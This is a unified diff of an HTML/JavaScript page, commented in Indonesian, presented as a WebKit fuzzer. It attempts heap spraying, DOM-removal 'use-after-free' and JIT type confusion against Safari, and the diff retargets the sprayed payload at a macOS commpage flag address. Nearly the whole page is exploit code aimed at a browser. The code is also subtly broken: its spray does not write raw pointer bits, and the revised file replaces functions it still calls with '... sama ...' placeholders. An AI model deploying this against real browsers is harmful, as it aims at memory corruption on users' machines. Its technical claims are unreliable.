@@ -1,87 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebKit Advanced Register Fuzzer</title>
-    <style>
-        body { margin: 15px; padding: 0; background-color: #0d1117; color: #c9d1d9; font-family: 'Courier New', monospace; }
-        .log { border: 1px solid #30363d; padding: 10px; max-height: 250px; overflow-y: scroll; margin-top: 15px; font-size: 11px; }
-        h1 { color: #2ea44f; font-size: 1.5em; }
-        .control-value { color: #ff0000; font-weight: bold; }
-    </style>
-</head>
+    <title>WebKit Commpage Target Fuzzer</title>
+    </head>
 <body>
 
-    <h1>Advanced WebKit Fuzzer (UAF/JIT Type Confusion)</h1>
-    <p>Target Nilai Kontrol (Harus di Register saat Crash): <span class="control-value">0xDEADBEEFCAFEBABE</span></p>
+    <h1>Advanced WebKit Fuzzer (Targeting Commpage Flag Address)</h1>
+    <p>Target Alamat Kontrol (Harus di Register saat Crash): <span class="control-value">0x0000000FFFFFC320</span></p>
     <p>Status: <span id="status">Memuat...</span></p>
     <p>Iterasi: <span id="counter">0</span> | Objek Global: <span id="obj-count">0</span></p>
     <div class="log" id="log">Log Aktivitas Detail:</div>
 
     <script>
-        // --- KONFIGURASI KONTROL ---
-        const TARGET_CONTROL_HEX = "0xDEADBEEFCAFEBABE";
-        const CONTROL_VALUE = BigInt(TARGET_CONTROL_HEX); 
-        // Potongan nilai 64-bit untuk injeksi ke array 32-bit (jika terjadi Type Confusion)
-        const LOW_WORD = Number(CONTROL_VALUE & 0xFFFFFFFFn);
-        const HIGH_WORD = Number(CONTROL_VALUE >> 32n);
+        // --- KONFIGURASI KONTROL (MENGGUNAKAN ALAMAT COMM PAGE) ---
+        // Kita menggunakan alamat _COMM_PAGE_ASB_TARGET_VALUE sebagai payload kita.
+        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
+        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
         
-        const MAX_GLOBAL_OBJS = 200; // Jumlah maksimum objek yang disimpan
+        // Nilai payload adalah alamat commpage target value
+        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; // 0x0000000FFFFFC320
+        
+        // Pisahkan menjadi bagian 32-bit (untuk injeksi array)
+        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
+        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n); // Untuk kasus userspace, ini kemungkinan besar 0
+        
+        // ... (Konstanta, fungsi logActivity, dll. sama seperti kode sebelumnya) ...
+        const MAX_GLOBAL_OBJS = 200; 
         let currentIteration = 0;
         let running = false;
-        let globalObjects = []; // Untuk menyimpan referensi yang akan dicoba UAF
+        let globalObjects = []; 
         
-        const LOG_LIMIT = 50; // Batasi log di layar
-
-        function logActivity(message) {
-            const logElement = document.getElementById('log');
-            logElement.innerHTML = '<div>[' + currentIteration + '] ' + message + '</div>' + logElement.innerHTML;
-            
-            // Hapus log lama untuk menjaga kinerja
-            while (logElement.children.length > LOG_LIMIT) {
-                logElement.removeChild(logElement.lastChild);
-            }
-        }
-
-        // Fungsi yang sangat penting: Heap Spraying/Feng Shui
+        // Fungsi Heap Spraying yang dimodifikasi
         function sprayHeap() {
-            // Alokasikan objek-objek dengan ukuran spesifik dan stabil
-            // untuk "mengisi" ulang lubang memori yang ditinggalkan oleh objek yang di-free.
-            
-            // Kita menggunakan Float64Array karena ini sering digunakan JIT dan memiliki ukuran stabil.
             const SPRAY_COUNT = 50;
-            const SPRAY_SIZE = 10; // Coba alokasi kecil
+            const SPRAY_SIZE = 10; 
             
             for (let i = 0; i < SPRAY_COUNT; i++) {
-                // Alokasikan Float64Array
                 let fillerArray = new Float64Array(SPRAY_SIZE);
                 
-                // Masukkan nilai kontrol ke array untuk injeksi data
-                // Kita berharap salah satu alokasi ini akan mendarat di atas objek yang di-free
-                fillerArray[0] = HIGH_WORD; 
-                fillerArray[1] = LOW_WORD;
-                fillerArray[2] = 1337.0 + i; // Nilai acak unik
+                // Masukkan ALAMAT TARGET COMM PAGE ke array
+                // Kita berharap alokasi ini akan menimpa pointer di memori
+                fillerArray[0] = HIGH_WORD; // Bagian atas alamat (0 di userspace)
+                fillerArray[1] = LOW_WORD;  // Bagian bawah alamat (0xFFFFC320)
+                fillerArray[2] = 1337.0 + i; 
 
-                // Simpan referensi array agar tidak segera di-garbage collect
                 globalObjects.push(fillerArray); 
             }
-            logActivity(`Heap Spray: ${SPRAY_COUNT} array diisi dengan ${TARGET_CONTROL_HEX}.`);
+            logActivity(`Heap Spray: ${SPRAY_COUNT} array diisi dengan alamat target Commpage.`);
         }
         
-        // Fungsi untuk menciptakan Type Confusion
-        function createTypeConfusion(obj) {
-             // Cobalah memaksakan optimasi JIT pada sebuah array
-             for (let i = 0; i < 1000; i++) {
-                 obj.a[0] = i; // Array dioptimalkan sebagai Array of Int
-             }
-             // Setelah dioptimalkan, secara tiba-tiba masukkan nilai yang bukan Int (misalnya DOM Element)
-             // Ini adalah pemicu Type Confusion
-             obj.a[0] = document.createElement('iframe'); 
-             logActivity("Type Confusion Pemicu: Mencoba mengubah tipe array yang dioptimalkan.");
-        }
+        // ... (Fungsi createTypeConfusion() sama) ...
 
-
-        // --- FUNGSI INTI FUZZING ---
-
+        // ... (Fungsi fuzzIteration() sama) ...
         function fuzzIteration() {
             if (!running) {
                 document.getElementById('status').textContent = 'STOPPED';
@@ -93,32 +63,26 @@
             document.getElementById('obj-count').textContent = globalObjects.length;
             
             try {
-                // 1. OBJECT ALLOCATION & SETUP
-                // Membuat objek yang kompleks untuk dioptimalkan JIT
+                // 1. OBJECT ALLOCATION & SETUP (Sama)
                 const newObj = {
-                    a: new Array(5).fill(currentIteration), // Array untuk Type Confusion
-                    b: document.createElement('canvas'), // DOM Element untuk UAF
+                    a: new Array(5).fill(currentIteration),
+                    b: document.createElement('canvas'),
                     c: currentIteration 
                 };
                 document.body.appendChild(newObj.b);
                 globalObjects.push(newObj);
 
-                // 2. TRIGGERING DELETION & UAF
+                // 2. TRIGGERING DELETION & UAF (Sama)
                 if (globalObjects.length > MAX_GLOBAL_OBJS) {
-                    // Tentukan rentang indeks yang akan diproses (misalnya 10 objek tertua)
                     const freeRangeStart = 0;
                     const freeRangeEnd = 10; 
                     
                     for (let i = freeRangeStart; i < freeRangeEnd; i++) {
                         const freedObj = globalObjects[i];
                         if (freedObj && freedObj.b && freedObj.b.parentNode) {
-                            // Hapus objek dari DOM (pemicu free)
                             freedObj.b.parentNode.removeChild(freedObj.b);
-                            
-                            // **JANGAN HAPUS DARI globalObjects (Ini adalah UAF)**
                         }
                     }
-                    // Hapus referensi yang sudah di-free agar tidak terus disimpan
                     globalObjects.splice(freeRangeStart, freeRangeEnd);
 
                     logActivity(`UAF Pemicu: ${freeRangeEnd} objek dihapus dari DOM.`);
@@ -127,53 +91,36 @@
                     sprayHeap();
                 }
 
-                // 3. EXPLOIT ATTEMPT: JIT Type Confusion & UAF Dereference
+                // 3. EXPLOIT ATTEMPT: UAF Dereference
                 if (globalObjects.length > 50 && (currentIteration % 50 === 0)) {
-                    // Coba UAF pada objek lama
                     const uafTarget = globalObjects[Math.floor(Math.random() * 50) + 10]; 
                     
                     if (uafTarget && uafTarget.a) {
                         // Coba Type Confusion pada array
                         createTypeConfusion(uafTarget); 
                         
-                        // Coba dereferensi (membaca atau menulis) properti yang mungkin kini ditimpa oleh data spray
-                        // Ini adalah titik di mana register mungkin diisi oleh CONTROL_VALUE
                         if (uafTarget.b) {
-                           // uafTarget.b sekarang mungkin ditimpa oleh pointer ke Float64Array
-                           // Jika kita berhasil, akses ke properti b akan memicu crash
-                           const crashValue = uafTarget.b.offsetWidth; // Coba akses properti yang membutuhkan pointer valid
+                           // uafTarget.b sekarang mungkin ditimpa oleh ALAMAT COMM PAGE
+                           // Ketika Safari mencoba membaca properti objek ini, ia mencoba membaca dari 0x0000000FFFFFC320
+                           // YANG BERISI NILAI RANDOM FLAG (_COMM_PAGE_ASB_TARGET_VALUE)
+                           
+                           // Ini akan menyebabkan crash saat mencoba mengakses memori tersebut (membaca nilai flag)
+                           const crashValue = uafTarget.b.offsetWidth; 
                            logActivity("UAF/Dereference: Mencoba membaca properti objek yang mungkin rusak. Nilai: " + crashValue);
                         }
                     }
                 }
                 
-                // Batasan objek agar memori tetap terkendali
-                if (globalObjects.length > 500) {
-                     globalObjects.splice(0, 50); // Hapus sebagian secara perlahan
-                }
-
+                // ... (Batasan objek) ...
 
             } catch (e) {
-                // Log kesalahan JS tapi jangan hentikan fuzzer (agar kerentanan lain dapat ditemukan)
-                // logActivity("JS Error: " + e.message); 
+                // ... (Penanganan kesalahan) ...
             }
 
-            // Jadwalkan iterasi berikutnya secepat mungkin
             setTimeout(fuzzIteration, 1); 
         }
 
-        // --- INITIALISASI ---
-
-        document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Fuzzing AKTIF. Jangan tutup tab/aplikasi.';
-            running = true;
-            // Bersihkan memori sebelum memulai
-            globalObjects = []; 
-            
-            // Mulai fuzzing
-            fuzzIteration();
-        });
-
+        // ... (Initialisasi sama) ...
     </script>
 </body>
 </html>
